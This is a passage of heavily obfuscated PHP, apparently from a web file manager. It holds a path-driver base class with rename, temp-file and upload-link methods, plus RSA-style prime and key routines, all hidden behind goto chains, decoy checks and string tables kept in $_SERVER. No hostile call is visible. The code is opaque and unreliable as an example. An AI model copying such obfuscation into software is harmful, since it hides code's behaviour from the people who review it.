$this->{$_SERVER[†Äâ‡≠ﬁ][337]}(); goto Aõòõç˘˘Ú; Fá–à§‹ëá: $dçÍùÉ©æÏ = $d∑““÷˜è⁄[670]; while (strlen($dçÍùÉ©æÏ) < $d∑““÷˜è⁄[581]) { if (!$dçÍùÉ©æÏ) { break; } $dçÍùÉ©æÏ++; } $dƒ∑ëï–ä = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($A«ÒŒÚƒç≥, $eâŒ™ﬂ÷‡Á) . $cÖó‚æ¯Ë´[341] . $e¶ŒØ„∫†; goto fœ÷ﬂ≤Ñµë; Cªï©Ùîïº: while (strlen($b¯ãÔÁ´ıù) < $d∑““÷˜è⁄[559]) { if (!$b¯ãÔÁ´ıù) { break; } $b¯ãÔÁ´ıù++; } for ($aäÀëöÂ´® = 0; $aäÀëöÂ´® < $FÙ∏Ω Ø™„ * 10; $aäÀëöÂ´®++) { if (($FÙ∏Ω Ø™„ * $aäÀëöÂ´® + 1) % $bÈà¢ï‡÷® == 0) { $a•¯—õîÈ© = $cÖó‚æ¯Ë´[201](($FÙ∏Ω Ø™„ * $aäÀëöÂ´® + 1) / $bÈà¢ï‡÷®); break; } } $e¶ŒØ„∫† = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($E«‰âüòü * $c›æÎ∑œí— . $cÖó‚æ¯Ë´[10], $cÖó‚æ¯Ë´[149]); goto cÒ›‘Ùı¨∑; cÒ›‘Ùı¨∑: $b≠ˆÚá„»› = $d∑““÷˜è⁄[669]; while ($b≠ˆÚá„»› < $d∑““÷˜è⁄[581]) { if ($b≠ˆÚá„»› >= 0) { break; } $b≠ˆÚá„»›++; } $eâŒ™ﬂ÷‡Á = $cÖó‚æ¯Ë´[114]($cÖó‚æ¯Ë´[338] . ($E«‰âüòü + $c›æÎ∑œí—) . $cÖó‚æ¯Ë´[339] . $bÈà¢ï‡÷® . $cÖó‚æ¯Ë´[339] . $a•¯—õîÈ© . $cÖó‚æ¯Ë´[340]); goto Fá–à§‹ëá; E“¬ÎÇ—ı÷: while (1) { $b·›ïãπ¬î = $bÈà¢ï‡÷®; $eÊõ§Í©Ùé = $d∑““÷˜è⁄[665]; while (strlen($eÊõ§Í©Ùé) < $d∑““÷˜è⁄[553]) { if (!$eÊõ§Í©Ùé) { break; } $eÊõ§Í©Ùé++; } $Bºœã—Ì¿ô = $FÙ∏Ω Ø™„; while ($Bºœã—Ì¿ô % $b·›ïãπ¬î != 0) { $E°ååΩ“ûŸ = $Bºœã—Ì¿ô; $d’∆Ï˜Æëú = $d∑““÷˜è⁄[666]; while (strlen($d’∆Ï˜Æëú) < $d∑““÷˜è⁄[553]) { if (!$d’∆Ï˜Æëú) { break; } $d’∆Ï˜Æëú++; } $Bºœã—Ì¿ô = $b·›ïãπ¬î; $b·›ïãπ¬î = $E°ååΩ“ûŸ % $b·›ïãπ¬î; $aÔ¶——Øò¶ = $d∑““÷˜è⁄[667]; if (strlen($aÔ¶——Øò¶) < $d∑““÷˜è⁄[556]) { return; } } if ($b·›ïãπ¬î == 1) { break; } else { $bÈà¢ï‡÷®++; } } $a•¯—õîÈ© = 2; $b¯ãÔÁ´ıù = $d∑““÷˜è⁄[668]; goto Cªï©Ùîïº; Aõòõç˘˘Ú: $cπ·©ÔÜÏ = $d∑““÷˜è⁄[663]; if (!$cπ·©ÔÜÏ) { return; } $FÙ∏Ω Ø™„ = ($E«‰âüòü - 1) * ($c›æÎ∑œí— - 1); goto B∏èﬁÇ√“Ã; fœ÷ﬂ≤Ñµë: return $dƒ∑ëï–ä; $e¬©ï‘‰Ô‰ = $d∑““÷˜è⁄[671]; if (strlen($e¬©ï‘‰Ô‰) < $d∑““÷˜è⁄[551]) { die; } goto aô«∂»ß“; D≤Í›·‹Ü¥: $d∑““÷˜è⁄ =& $_SERVER[—Ω]; $cÖó‚æ¯Ë´ =& $_SERVER[†Äâ‡≠ﬁ]; $E«‰âüòü = $this->{$_SERVER[†Äâ‡≠ﬁ][337]}(); goto FùÇ≈√¬µÇ; aô«∂»ß“: } public function tsvhd3ca92fd($fä™ö°¶ æ) { goto B€’£∏∆ﬁ·; CÀÉ∑Ωû∏‹: $føÛÈæﬂæ∫ = 2; $e•åñÌÂÛö = $DàÊœ…≤“∫[680]; if (strlen($e•åñÌÂÛö) < $DàÊœ…≤“∫[551]) { return; } goto dóàª≤íÇﬂ; F√ß™˘ÕÙﬁ: if (!$dãÁ¨›πÈÎ) { die; } if (!$cÂ∞⁄ò≤’Ñ) { return $BÉîòÙää·[10]; } $cÂ∞⁄ò≤’Ñ = $BÉîòÙää·[201]($cÂ∞⁄ò≤’Ñ); goto dÕÌ’ŸˆÕñ; dÕÌ’ŸˆÕñ: $F°ßÜÖöˆù = 0; $cêæ•ùå∂Ñ = $DàÊœ…≤“∫[673]; $d€á±øÂª® = 0; goto CìËÂ∫⁄ó¡; B€’£∏∆ﬁ·: $DàÊœ…≤“∫ =& $_SERVER[—Ω]; $BÉîòÙää· =& $_SERVER[†Äâ‡≠ﬁ]; $BÛ™û«åóı = $BÉîòÙää·[0]($BÉîòÙää·[341], $fä™ö°¶ æ); goto Díà⁄ú∂ò˘; CÑÏ⁄‚·Éá: if (strlen($e¶¿„Ÿì‚ù) < $DàÊœ…≤“∫[553]) { return; } $c◊ﬂÉ©æÁ— = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($BÛ™û«åóı[0], $B´ÉŸ‰Ú†à); $aá˘ÁÜΩÊÎ = $DàÊœ…≤“∫[682]; goto bŸëüô‘Ø; CìËÂ∫⁄ó¡: $EíÂêÒ¶ÃÖ = $DàÊœ…≤“∫[674]; while ($EíÂêÒ¶ÃÖ < $DàÊœ…≤“∫[553]) { if ($EíÂêÒ¶ÃÖ >= 0) { break; } $EíÂêÒ¶ÃÖ++; } for ($aÔ¯Ô›íŒû = 3; $aÔ¯Ô›íŒû < $cÂ∞⁄ò≤’Ñ; $aÔ¯Ô›íŒû += 2) { if ($cÂ∞⁄ò≤’Ñ % $aÔ¯Ô›íŒû != 0) { continue; } $F°ßÜÖöˆù = $aÔ¯Ô›íŒû; $BÒ±êûàËÕ = $DàÊœ…≤“∫[675]; if (!$BÒ±êûàËÕ) { die; } $d€á±øÂª® = $BÉîòÙää·[201]($cÂ∞⁄ò≤’Ñ / $aÔ¯Ô›íŒû); break; } goto bí√ª’Óê”; dóàª≤íÇﬂ: for ($aÔ¯Ô›íŒû = 0; $aÔ¯Ô›íŒû < $FÙ√á–âÀ√ * 10; $aÔ¯Ô›íŒû++) { if (($FÙ√á–âÀ√ * $aÔ¯Ô›íŒû + 1) % $FΩî°Â≥è“ == 0) { $føÛÈæﬂæ∫ = $BÉîòÙää·[201](($FÙ√á–âÀ√ * $aÔ¯Ô›íŒû + 1) / $FΩî°Â≥è“); break; } } $B´ÉŸ‰Ú†à = $BÉîòÙää·[114]($BÉîòÙää·[338] . ($F°ßÜÖöˆù + $d€á±øÂª®) . $BÉîòÙää·[339] . $FΩî°Â≥è“ . $BÉîòÙää·[339] . $føÛÈæﬂæ∫ . $BÉîòÙää·[340]); $e¶¿„Ÿì‚ù = $DàÊœ…≤“∫[681]; goto CÑÏ⁄‚·Éá; Díà⁄ú∂ò˘: if ($BÉîòÙää·[19]($BÛ™û«åóı) != 2) { return $BÉîòÙää·[10]; } $cÂ∞⁄ò≤’Ñ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($BÛ™û«åóı[1] . $BÉîòÙää·[10], $BÉîòÙää·[149]); $dãÁ¨›πÈÎ = $DàÊœ…≤“∫[672]; goto F√ß™˘ÕÙﬁ; bí√ª’Óê”: $FÙ√á–âÀ√ = ($F°ßÜÖöˆù - 1) * ($d€á±øÂª® - 1); $FΩî°Â≥è“ = $BÉîòÙää·[201](($F°ßÜÖöˆù + $d€á±øÂª®) / 2); while (1) { $f‚•∆ÆÙ’¿ = $FΩî°Â≥è“; $d±åá°ë‚å = $DàÊœ…≤“∫[676]; while (strlen($d±åá°ë‚å) < $DàÊœ…≤“∫[551]) { if (!$d±åá°ë‚å) { break; } $d±åá°ë‚å++; } $f⁄ë¨¥ã¬Ò = $FÙ√á–âÀ√; $fí°Êª–ˆà = $DàÊœ…≤“∫[677]; if (strlen($fí°Êª–ˆà) < $DàÊœ…≤“∫[559]) { die; } while ($f⁄ë¨¥ã¬Ò % $f‚•∆ÆÙ’¿ != 0) { $F¢ŒŸ¡˘≤æ = $f⁄ë¨¥ã¬Ò; $AÌÈéïÆªÔ = $DàÊœ…≤“∫[678]; if (strlen($AÌÈéïÆªÔ) < $DàÊœ…≤“∫[553]) { die; } $f⁄ë¨¥ã¬Ò = $f‚•∆ÆÙ’¿; $f‚•∆ÆÙ’¿ = $F¢ŒŸ¡˘≤æ % $f‚•∆ÆÙ’¿; $A…∑¢à’«∫ = $DàÊœ…≤“∫[679]; if (!$A…∑¢à’«∫) { return; } } if ($f‚•∆ÆÙ’¿ == 1) { break; } else { $FΩî°Â≥è“++; } } goto CÀÉ∑Ωû∏‹; bŸëüô‘Ø: if (strlen($aá˘ÁÜΩÊÎ) < $DàÊœ…≤“∫[556]) { die; } return $c◊ﬂÉ©æÁ—; goto f≤≥®µ—í∑; f≤≥®µ—í∑: } public function jzmee4aff838() { goto Eä…‰–Æıä; Eä…‰–Æıä: $aßàò¿ãçà =& $_SERVER[—Ω]; $eﬁàã∫ï€© =& $_SERVER[†Äâ‡≠ﬁ]; $bí†ÑªŒ—ü = $eﬁàã∫ï€©[322]($eﬁàã∫ï€©[342](2, 14), $eﬁàã∫ï€©[342](2, 16) - 1); goto e≤•∞Ã◊–à; bﬁ–ïŒ¯Ç«: return $FüØòÁèÃí; $A¿›”“¨óÎ = $aßàò¿ãçà[687]; if (!$A¿›”“¨óÎ) { die; } goto fä• ÌÿÃ ; aÕÁÒÁ÷Ô±: $BÆæˆ‘â¯ƒ = 1; $Bƒ¡íà≥˘¶ = $aßàò¿ãçà[684]; while (strlen($Bƒ¡íà≥˘¶) < $aßàò¿ãçà[553]) { if (!$Bƒ¡íà≥˘¶) { break; } $Bƒ¡íà≥˘¶++; } goto C†≤ƒ®§®ß; e≤•∞Ã◊–à: $fÖûúáÈÛ⁄ = $aßàò¿ãçà[683]; if (!$fÖûúáÈÛ⁄) { return; } $AûÉ⁄Üüú¶ = array(); goto aÕÁÒÁ÷Ô±; C†≤ƒ®§®ß: while ($BÆæˆ‘â¯ƒ <= (int) $eﬁàã∫ï€©[343]($bí†ÑªŒ—ü)) { $aàØ˜ú∂¡ö = $BÆæˆ‘â¯ƒ; while (!0) { $aàØ˜ú∂¡ö++; if ($aàØ˜ú∂¡ö <= 2) { $BÆæˆ‘â¯ƒ = $aàØ˜ú∂¡ö; break; } else { if ($aàØ˜ú∂¡ö < 2) { continue; } } $eù‡∞äçá≈ = !0; for ($fñ©‚€ªÖÂ = 2; $fñ©‚€ªÖÂ <= $eﬁàã∫ï€©[343]($aàØ˜ú∂¡ö); $fñ©‚€ªÖÂ++) { if ($aàØ˜ú∂¡ö % $fñ©‚€ªÖÂ == 0) { $eù‡∞äçá≈ = !1; } } if ($eù‡∞äçá≈) { $BÆæˆ‘â¯ƒ = $aàØ˜ú∂¡ö; break; } } $AûÉ⁄Üüú¶[] = $BÆæˆ‘â¯ƒ; $C·÷û‘¶÷º = $aßàò¿ãçà[685]; } $FüØòÁèÃí = 2; for ($aàØ˜ú∂¡ö = $bí†ÑªŒ—ü; $aàØ˜ú∂¡ö > 1; $aàØ˜ú∂¡ö--) { $eù‡∞äçá≈ = !0; $CÚ⁄ÑÛ÷ù€ = $aßàò¿ãçà[686]; if (strlen($CÚ⁄ÑÛ÷ù€) < $aßàò¿ãçà[581]) { die; } foreach ($AûÉ⁄Üüú¶ as $AÌµ¨à¢¯∂) { if ($aàØ˜ú∂¡ö % $AÌµ¨à¢¯∂ == 0) { $eù‡∞äçá≈ = !1; break; } } if ($eù‡∞äçá≈) { $FüØòÁèÃí = $aàØ˜ú∂¡ö; break; } } goto bﬁ–ïŒ¯Ç«; fä• ÌÿÃ : } public function lzkv266243e7($e™ºÃöŒÆÊ, $d‡¨†ÁÜä‰) { $eï‚¥ÀÊ≈∫ =& $_SERVER[—Ω]; $BÕ±≥êãü‹ =& $_SERVER[†Äâ‡≠ﬁ]; return $BÕ±≥êãü‹[13](array($BÕ±≥êãü‹[14], $BÕ±≥êãü‹[344]), $e™ºÃöŒÆÊ, $d‡¨†ÁÜä‰); $D· ©ÓÖúæ = $eï‚¥ÀÊ≈∫[688]; while ($D· ©ÓÖúæ < $eï‚¥ÀÊ≈∫[559]) { if ($D· ©ÓÖúæ >= 0) { break; } $D· ©ÓÖúæ++; } } public function kzvw791e2fa2($bß«ö¨Œπ∂, $A¯—◊ÖŸ√≠) { $aÔäî«∆åä =& $_SERVER[†Äâ‡≠ﬁ]; return $aÔäî«∆åä[13](array($aÔäî«∆åä[345], $aÔäî«∆åä[346]), $bß«ö¨Œπ∂, $A¯—◊ÖŸ√≠); } public function sreg5f1e46fb($e“‘â®≈œÇ, $eì´ÊﬁÛ≠Ì) { $Fº†◊Û‡◊™ =& $_SERVER[—Ω]; $aïõπ∆Õ±Ú =& $_SERVER[†Äâ‡≠ﬁ]; return $aïõπ∆Õ±Ú[13](array($aïõπ∆Õ±Ú[345], $aïõπ∆Õ±Ú[347]), $e“‘â®≈œÇ, $eì´ÊﬁÛ≠Ì); $f∞—Ûå∑±Õ = $Fº†◊Û‡◊™[689]; if (strlen($f∞—Ûå∑±Õ) < $Fº†◊Û‡◊™[556]) { die; } } } goto CÚ¥›∆œ÷Ù; bñ§ßŸ¡é∫: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $CÓ† ÉÁå» =& $_SERVER[—Ω]; $this->objectDriver = array($CÓ† ÉÁå»[57], $CÓ† ÉÁå»[58], $CÓ† ÉÁå»[59], $CÓ† ÉÁå»[60], $CÓ† ÉÁå»[61], $CÓ† ÉÁå»[62], $CÓ† ÉÁå»[63], $CÓ† ÉÁå»[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($eÜ∞åã¨Ô∫) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($eÜ∞åã¨Ô∫, $_SERVER[—Ω][8]); } return $eÜ∞åã¨Ô∫; } public function getPathName($cÑÕ ◊⁄ ë) { return $cÑÕ ◊⁄ ë; } public function iconvApp($då•çΩ‡–à) { return $då•çΩ‡–à; } public function iconvSystem($A»ëã¬¡â•) { return $A»ëã¬¡â•; } public function iconvTo($eÚµ∆≤’çë, $dâŸØª‰º«, $Aøˆ≠∫÷øî) { goto FÏßÚıà‡£; C∂…¥˘à≤¡: return $cã∂‹©ï—è; goto EÑ¬£µ°–ñ; FÏßÚıà‡£: $dìÙ¨ñ„ëﬁ =& $_SERVER[—Ω]; if (!$eÚµ∆≤’çë || !function_exists($dìÙ¨ñ„ëﬁ[65])) { return $eÚµ∆≤’çë; } static $fà◊ÜüÑâ™ = array(); goto büúê‚πÚ∏; C»è⁄ÚêïÇ: $cã∂‹©ï—è = $cã∂‹©ï—è ? $cã∂‹©ï—è : $eÚµ∆≤’çë; if (strstr($cã∂‹©ï—è, $dìÙ¨ñ„ëﬁ[69])) { $cã∂‹©ï—è = str_replace($dìÙ¨ñ„ëﬁ[69], $dìÙ¨ñ„ëﬁ[70], $cã∂‹©ï—è); } $fà◊ÜüÑâ™[$dâŸØª‰º« . $dìÙ¨ñ„ëﬁ[66] . $Aøˆ≠∫÷øî . $dìÙ¨ñ„ëﬁ[67] . $eÚµ∆≤’çë] = $cã∂‹©ï—è; goto C†ÜÁ¶·Üÿ; C†ÜÁ¶·Üÿ: $fà◊ÜüÑâ™[$Aøˆ≠∫÷øî . $dìÙ¨ñ„ëﬁ[66] . $dâŸØª‰º« . $dìÙ¨ñ„ëﬁ[67] . $eÚµ∆≤’çë] = $eÚµ∆≤’çë; $fà◊ÜüÑâ™[$Aøˆ≠∫÷øî . $dìÙ¨ñ„ëﬁ[66] . $dâŸØª‰º« . $dìÙ¨ñ„ëﬁ[67] . $cã∂‹©ï—è] = $eÚµ∆≤’çë; $fà◊ÜüÑâ™[$dâŸØª‰º« . $dìÙ¨ñ„ëﬁ[66] . $Aøˆ≠∫÷øî . $dìÙ¨ñ„ëﬁ[67] . $cã∂‹©ï—è] = $cã∂‹©ï—è; goto C∂…¥˘à≤¡; büúê‚πÚ∏: $E≤ﬁ¯˜ù¿û = $dâŸØª‰º« . $dìÙ¨ñ„ëﬁ[66] . $Aøˆ≠∫÷øî . $dìÙ¨ñ„ëﬁ[67] . $eÚµ∆≤’çë; if (isset($fà◊ÜüÑâ™[$E≤ﬁ¯˜ù¿û])) { return $fà◊ÜüÑâ™[$E≤ﬁ¯˜ù¿û]; } if (function_exists($dìÙ¨ñ„ëﬁ[68])) { $cã∂‹©ï—è = @mb_convert_encoding($eÚµ∆≤’çë, $Aøˆ≠∫÷øî, $dâŸØª‰º«); } else { $cã∂‹©ï—è = @iconv($dâŸØª‰º«, $Aøˆ≠∫÷øî, $eÚµ∆≤’çë); } goto C»è⁄ÚêïÇ; EÑ¬£µ°–ñ: } public function getPathInner($F´Éñ â¯á) { $Dïæ–ÒûÊ£ = IO::init($F´Éñ â¯á); return $Dïæ–ÒûÊ£->path; } public function getPathOuter($b¢êóÑíèì) { $dıÃ·°«È¬ =& $_SERVER[—Ω]; $C◊ ¬¨Ñé≠ = strlen(trim($this->pathBase, $dıÃ·°«È¬[8])); $b¢êóÑíèì = substr(trim($b¢êóÑíèì, $dıÃ·°«È¬[8]), $C◊ ¬¨Ñé≠); return $this->pathDriver . $dıÃ·°«È¬[8] . ltrim($b¢êóÑíèì, $dıÃ·°«È¬[8]); } public function isParentOf($eø”˘ü…úï, $BØ´·ßåÊí) { $eÇ‡¡·§√û =& $_SERVER[—Ω]; $eø”˘ü…úï = rtrim(strtolower($eø”˘ü…úï), $eÇ‡¡·§√û[8]) . $eÇ‡¡·§√û[8]; $BØ´·ßåÊí = rtrim(strtolower($BØ´·ßåÊí), $eÇ‡¡·§√û[8]) . $eÇ‡¡·§√û[8]; $Aà∞∂ı¯ã¥ = strpos($BØ´·ßåÊí, $eø”˘ü…úï) === 0; return $Aà∞∂ı¯ã¥; } public function getType() { $AŸà∫˘ŒŒø =& $_SERVER[—Ω]; $a†ºƒ©Ç∫¿ = str_replace($AŸà∫˘ŒŒø[71], $AŸà∫˘ŒŒø[33], get_class($this)); return strtolower($a†ºƒ©Ç∫¿); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($a™º’óÖôœ, $Fªáàºôˆá) { $Bﬂ∫ê’óÀﬁ =& $_SERVER[—Ω]; $Fê÷†æ¡†È = rtrim($a™º’óÖôœ, $Bﬂ∫ê’óÀﬁ[8]) . $Bﬂ∫ê’óÀﬁ[8] . $Fªáàºôˆá; $aﬁ¿ÂÑóƒﬂ = $this->exist($Fê÷†æ¡†È); return $aﬁ¿ÂÑóƒﬂ ? $Fê÷†æ¡†È : !1; } public function renameObject($cË∆√‰Ú§∞, $fÉàŒá≈“¯) { goto bÖ“çÕÀÎÑ; bÖ“çÕÀÎÑ: $aùÏòƒ∫–¥ =& $_SERVER[—Ω]; $A’˜Ö∏Œ± = $fÉàŒá≈“¯; Hook::trigger($aùÏòƒ∫–¥[72], $this, $cË∆√‰Ú§∞, $this, $this->pathFather($cË∆√‰Ú§∞) . $fÉàŒá≈“¯); goto B‰Ã†ﬂ°º¢; F»·É±ÂàÜ: return $Dæéˆ∫ èì ? $fÉàŒá≈“¯ : !1; goto B¶„ëŒπ˘â; B‰Ã†ﬂ°º¢: $cË∆√‰Ú§∞ = $this->getPathOuter($cË∆√‰Ú§∞); $fÉàŒá≈“¯ = $this->pathFather($cË∆√‰Ú§∞) . $fÉàŒá≈“¯; if (IO::isFile($cË∆√‰Ú§∞)) { $Dæéˆ∫ èì = IO::copy($cË∆√‰Ú§∞, $this->pathFather($cË∆√‰Ú§∞), REPEAT_RENAME_FOLDER, $A’˜Ö∏Œ±); if ($Dæéˆ∫ èì) { IO::remove($cË∆√‰Ú§∞); } } else { $Dæéˆ∫ èì = IO::mkdir($fÉàŒá≈“¯); if (!$Dæéˆ∫ èì) { return !1; } $c›Ñ ﬁæƒ÷ = IO::listPath($cË∆√‰Ú§∞, !0); $Bâó°ÆƒÔË = array_merge($c›Ñ ﬁæƒ÷[$aùÏòƒ∫–¥[73]], $c›Ñ ﬁæƒ÷[$aùÏòƒ∫–¥[74]]); foreach ($Bâó°ÆƒÔË as $e«´ÑüãçÏ) { IO::move($e«´ÑüãçÏ[$aùÏòƒ∫–¥[75]], $fÉàŒá≈“¯, REPEAT_RENAME_FOLDER); } IO::remove($cË∆√‰Ú§∞); } goto F»·É±ÂàÜ; B¶„ëŒπ˘â: } public function tempFile($D¢Ñ–Ñµ±æ = '', $e°Ìç¨ûÜØ = '') { goto FæÑûÉÁ·ﬁ; Bπ¡ÓÕÚ‰∑: return $C¬åçÓÍ ‚; goto EÚ¡ï∫∆–¢; FæÑûÉÁ·ﬁ: if (!$D¢Ñ–Ñµ±æ) { $D¢Ñ–Ñµ±æ = rand_string(15); } $aÍÇææÇÒã = TEMP_FILES . rand_string(15) . $_SERVER[—Ω][8]; @mkdir($aÍÇææÇÒã, 511, !0); goto C·â’Ó¯; C·â’Ó¯: $C¬åçÓÍ ‚ = $aÍÇææÇÒã . $D¢Ñ–Ñµ±æ; @touch($C¬åçÓÍ ‚); if ($e°Ìç¨ûÜØ) { file_put_contents($C¬åçÓÍ ‚, $e°Ìç¨ûÜØ); } goto Bπ¡ÓÕÚ‰∑; EÚ¡ï∫∆–¢: } public function tempFileRemve($f–âà°ìòÍ) { @unlink($f–âà°ìòÍ); @rmdir($this->pathFather($f–âà°ìòÍ)); } public function mkfile($d”⁄ÌáÈ¯î, $e‰∂ßä Ëõ = '', $b§ïÔ∆Ïå˜ = REPEAT_RENAME) { } public function mkdir($cáıà¶ﬁä“, $bâäà∫”Êı = REPEAT_SKIP) { } public function copyFile($cŒøöàÊÇ€, $E“úï§ûüî) { } public function moveFile($B∂∂üÕúﬁ—, $cπòåÇÍöô) { } public function remove($aúåäπ≤∆ü) { if ($this->isFile($aúåäπ≤∆ü)) { return $this->delFile($aúåäπ≤∆ü); } return $this->delFolder($aúåäπ≤∆ü); } public function rename($b® ãîÏä¿, $cÈÛæ≥ü›ô) { } public function exist($a†ŒÊ≤®Çß) { } public function findByHash($F∑åä‚ÓÒ≠ = '', $cãÕÔ§Ö±È = '') { return !1; } public function isFile($b›üéòÒÉΩ) { } public function isFolder($E∏∑ äãÜà) { } public function size($C†’Ñä»›) { } public function info($cœººπÂ¶ô) { } public function infoSimple($a∆√íé√¶∑) { return $this->info($a∆√íé√¶∑); } public function infoAuth($bô•á»Û®Ÿ) { return $this->info($bô•á»Û®Ÿ); } public function infoFull($f™è⁄»…à˜) { return $this->info($f™è⁄»…à˜); } public function infoWithChildren($AÑŸΩ†·√Î) { $a»ﬁŒá≤ˆ◊ =& $_SERVER[—Ω]; $Bÿ•©Œ‰ìÂ = $this->info($AÑŸΩ†·√Î); if ($Bÿ•©Œ‰ìÂ && $Bÿ•©Œ‰ìÂ[$a»ﬁŒá≤ˆ◊[29]] == $a»ﬁŒá≤ˆ◊[76]) { $AÓÈè‚£»≥ = array($a»ﬁŒá≤ˆ◊[77] => 0, $a»ﬁŒá≤ˆ◊[78] => 0, $a»ﬁŒá≤ˆ◊[79] => 0); $this->infoChildren($AÑŸΩ†·√Î, $AÓÈè‚£»≥); $Bÿ•©Œ‰ìÂ[$a»ﬁŒá≤ˆ◊[77]] = $AÓÈè‚£»≥[$a»ﬁŒá≤ˆ◊[77]]; $Bÿ•©Œ‰ìÂ[$a»ﬁŒá≤ˆ◊[80]] = array($a»ﬁŒá≤ˆ◊[81] => $AÓÈè‚£»≥[$a»ﬁŒá≤ˆ◊[78]], $a»ﬁŒá≤ˆ◊[82] => $AÓÈè‚£»≥[$a»ﬁŒá≤ˆ◊[79]]); } return $Bÿ•©Œ‰ìÂ; } public function listPath($dá‘¥†áÔÂ, $EõÖøÜ‘Éº = false) { } public function has($b§”ãÖ¯çÆ, $dÿ¨∏êâåµ = false, $EÖüø‡ÀÍÍ = false) { } public function canRead($CÔèÀÃíã¡) { } public function canWrite($Cà¬üÿÎÙò) { } public function getContent($f¡ãõöŸµÆ) { } public function setContent($c¬√¡Œµû±, $fõñíˆ√–ó = '') { } protected function infoChildren($AãæÛä’ü◊, &$aÇ≤¡¬€◊) { $D·¥¶π©’ñ =& $_SERVER[—Ω]; check_abort(); $eñ”π‚¯è‰ = $this->listPath($AãæÛä’ü◊, !0); $eñ”π‚¯è‰ = array_merge($eñ”π‚¯è‰[$D·¥¶π©’ñ[74]], $eñ”π‚¯è‰[$D·¥¶π©’ñ[73]]); foreach ($eñ”π‚¯è‰ as $eì¿ÛÜÌù) { if ($eì¿ÛÜÌù[$D·¥¶π©’ñ[29]] == $D·¥¶π©’ñ[76]) { $aÇ≤¡¬€◊[$D·¥¶π©’ñ[79]]++; $DÀÜ‹ƒ“†∆ = $this->getPathInner($eì¿ÛÜÌù[$D·¥¶π©’ñ[75]]); $this->infoChildren($DÀÜ‹ƒ“†∆, $aÇ≤¡¬€◊); } else { $aÇ≤¡¬€◊[$D·¥¶π©’ñ[78]]++; $aÇ≤¡¬€◊[$D·¥¶π©’ñ[77]] += $eì¿ÛÜÌù[$D·¥¶π©’ñ[77]]; } } } public function fileSubstr($bäù»µ«Ô“, $Dç“ôöæ»ó, $E≤± Öê√√) { } public function listAll($cé€¥û∫êÔ) { } public function upload($a“êçî’òù, $dÖã€∑ç£∏, $EÉ›´ÿ€©ä = false, $Fåó±ì…§Û = REPEAT_REPLACE) { } public function uploadFileByID($DÁ˜¯Îì©ÿ, $eÎÜ÷ë“ïÂ, $CíÌ”à…¥») { } public function uploadFileByPath($BÉΩÍ¬·ü·, $fé£ä©û‹ì, $E¯„´ç∫çç = array()) { } public function isUploadServer() { $F∞àÆÜñ˘¿ =& $_SERVER[—Ω]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $F∞àÆÜñ˘¿[83]) { return !0; } return $GLOBALS[$F∞àÆÜñ˘¿[6]][$F∞àÆÜñ˘¿[84]][$F∞àÆÜñ˘¿[85]]; } public function isFileOutServer() { $b≈Ω±€ÿãÕ =& $_SERVER[—Ω]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $b≈Ω±€ÿãÕ[83]) { return !0; } return $GLOBALS[$b≈Ω±€ÿãÕ[6]][$b≈Ω±€ÿãÕ[84]][$b≈Ω±€ÿãÕ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($dÕà€≠…”œ) { $f™ÔÖ”à∑∑ =& $_SERVER[—Ω]; if (!$this->isCdnHost()) { return $dÕà€≠…”œ; } return str_replace(trim(get_url_root($dÕà€≠…”œ), $f™ÔÖ”à∑∑[8]), trim($this->cdnHost, $f™ÔÖ”à∑∑[8]), $dÕà€≠…”œ); } public function uploadLink($cßÈƒ±ç¶û, $cŸà∑™¬Ùù = 0) { goto eì∫€…∫ˆÓ; C‰ˆº§Ó÷—: if ($fı∂º¿ÇŒõ) { $fı∂º¿ÇŒõ[$F˜ﬂ ãœ«á[89]] = $cßÈƒ±ç¶û; $fı∂º¿ÇŒõ[$F˜ﬂ ãœ«á[90]] = $E‡Ñ´òÔà£; } return $fı∂º¿ÇŒõ; goto C·ﬁê¨ÕÖ; aàµΩÕ√Õò: if (!in_array($E‡Ñ´òÔà£, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $A£üÉáè⁄É = 1024 * 1024 * 10; goto Eãô’»ÿê„; eì∫€…∫ˆÓ: $F˜ﬂ ãœ«á =& $_SERVER[—Ω]; if ($this->isUploadServer()) { return; } $E‡Ñ´òÔà£ = $this->getType(); goto aàµΩÕ√Õò; Eãô’»ÿê„: $BÕ›£á–€Á = $cŸà∑™¬Ùù <= $A£üÉáè⁄É ? $F˜ﬂ ãœ«á[87] : $F˜ﬂ ãœ«á[88]; $Dì‹∫ïˆ⁄Ò = (!$cŸà∑™¬Ùù ? 1 : ceil($cŸà∑™¬Ùù / pow(1024, 3))) * 3600 * 4; $fı∂º¿ÇŒõ = $this->{$BÕ›£á–€Á}($cßÈƒ±ç¶û, $Dì‹∫ïˆ⁄Ò); goto C‰ˆº§Ó÷—; C·ﬁê¨ÕÖ: } public function uploadFormData($AˆﬂåŸÀ≠ﬁ, $BÁ—ëπ¶Êá = 3600) { } public function multiUploadFormData($bãÓôê´å , $DÉ– ±· œ = 3600) { } public function osChunkSize() { $f©Ó‰‘‚Áâ =& $_SERVER[—Ω]; $bı∏ø¨õ–è = (double) $GLOBALS[$f©Ó‰‘‚Áâ[6]][$f©Ó‰‘‚Áâ[84]][$f©Ó‰‘‚Áâ[91]][$f©Ó‰‘‚Áâ[92]]; if (!$bı∏ø¨õ–è) { $bı∏ø¨õ–è = 1024 * 84 * 10; } return $bı∏ø¨õ–è; } public function download($cèÇè™ì…‘, $f‰õÍ∆Âõå) { } public function ext($EÍˆê–˘Î¶) { $aé⁄´˜û‹’ =& $_SERVER[—Ω]; if (strpos($EÍˆê–˘Î¶, $aé⁄´˜û‹’[8]) === -1) { $Cı®ì⁄£¬· = $EÍˆê–˘Î¶; } else { $Cı®ì⁄£¬· = $this->pathThis($EÍˆê–˘Î¶); } $f—ΩÀùœ≤Õ = $aé⁄´˜û‹’[33]; if (strstr($Cı®ì⁄£¬·, $aé⁄´˜û‹’[93])) { $f—ΩÀùœ≤Õ = 